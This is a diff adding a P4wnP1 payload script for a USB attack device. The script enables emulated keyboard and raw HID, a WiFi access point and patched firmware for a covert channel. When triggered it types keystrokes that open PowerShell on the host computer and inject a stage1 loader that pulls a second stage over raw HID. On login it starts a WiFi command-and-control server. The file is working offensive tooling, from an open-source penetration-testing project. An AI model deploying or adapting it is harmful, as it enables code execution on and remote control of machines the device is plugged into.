@@ -1,0 +1,114 @@
+#    This file is part of P4wnP1.
+#
+#    Copyright (c) 2017, Marcus Mengs. 
+#
+#    P4wnP1 is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+#
+#    P4wnP1 is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License
+#    along with P4wnP1.  If not, see <http://www.gnu.org/licenses/>.
+
+
+
+# P4wnP1 WiFi covert channel !! EXPERIMENTAL !!
+# ==========================
+
+# overwrite keyboard language from setup.cfg
+lang="us" 
+
+
+# =============================
+# USB setup
+# =============================
+# Make sure to change USB_PID if you enable different USB functionality in order
+# to force Windows to enumerate the device again
+USB_VID="0x1d6b"        # Vendor ID
+USB_PID="0x4137"        # Product ID
+
+USE_ECM=false            # if true CDC ECM will be enabled
+USE_RNDIS=false          # if true RNDIS will be enabled
+USE_HID=true            # if true HID (keyboard) will be enabled
+USE_RAWHID=true         # if true HID raw device will be enabled
+USE_UMS=false           # if true USB Mass Storage will be enabled
+
+# disable setting of static routes for all IPv4 addresses
+ROUTE_SPOOF=false
+
+# use LED based HID keyboard test
+USE_HID_TEST=true
+
+# WIFI config
+WIFI_NEXMON=true # use modified nexmon firmware (patched for covert channel)
+WIFI_NEXMON_BRING_UP_MONITOR_FIRST=true	# we force monitor interface creation before starting hostapd
+
+WIFI_REG=US
+WIFI_ACCESSPOINT=true
+WIFI_ACCESSPOINT_CHANNEL=6
+WIFI_ACCESSPOINT_NAME="P4wnP1"
+WIFI_ACCESSPOINT_PSK="MaMe82-P4wnP1"
+WIFI_ACCESSPOINT_IP="172.24.0.1" # IP used by P4wnP1
+WIFI_ACCESSPOINT_NETMASK="255.255.255.0"
+WIFI_ACCESSPOINT_DHCP_RANGE="172.24.0.2,172.24.0.100" # DHCP Server IP Range
+WIFI_ACCESSPOINT_HIDE_SSID=false # don't hide ESSID 
+
+BLUETOOTH_NAP=true # enable bluetooth NAP, P4wnP1 will be rechable via IP configured in setup.cfg (BLUETOOTH_NAP_IP)
+
+
+# blink one time when payload script get's initiated
+led_blink 1 # usage at thi point is invalid, as the script gets called again on SSH login
+
+function onKeyboardUp()
+{
+
+	# start HID payload delivery server
+	screen -dmS hidsrv bash -c "cd $wdir/hidtools/payload_delivery; python hidserver.py"
+
+	# blink two times when hid keyboard is usable and HID server is started
+	led_blink 2
+
+	# as soon as NUMLOCK is pressed rapidly we start the 32 bit PowerShell (needed for payload)
+	while $true; do
+		# wait for keyboard LED trigger
+		key_trigger
+	
+		# run interactive PowerShell console
+		cat <<- EOF | duckhid
+			GUI r
+			DELAY 500
+			STRING powershell.exe
+			ENTER
+			DELAY 1000
+EOF
+
+		# output stage1 command (loads stage2 via raw HID)
+		(printf "\$USB_VID='1D6B';\$USB_PID='4137';"; cat $wdir/hidtools/payload_delivery/stage1_mini.ps1) | outhid
+
+	done
+
+}
+
+
+# commands in this function are ran on user login
+# the commans are ran by user "pi"
+function onLogin()
+{
+	if [ -f /tmp/server_started ]; then
+		echo "Attaching to WiFi covert channel server's screen session ..."
+	else
+		echo "Starting covert channel server"
+		sudo screen -dmS wifi_c2 bash -c "cd $wdir/nexmon; python wifi_server.py"
+		touch /tmp/server_started
+	fi
+
+	#sudo screen -d -r
+	# attach to covert channel control server
+	sudo screen -d -r wifi_c2
+	return
+}
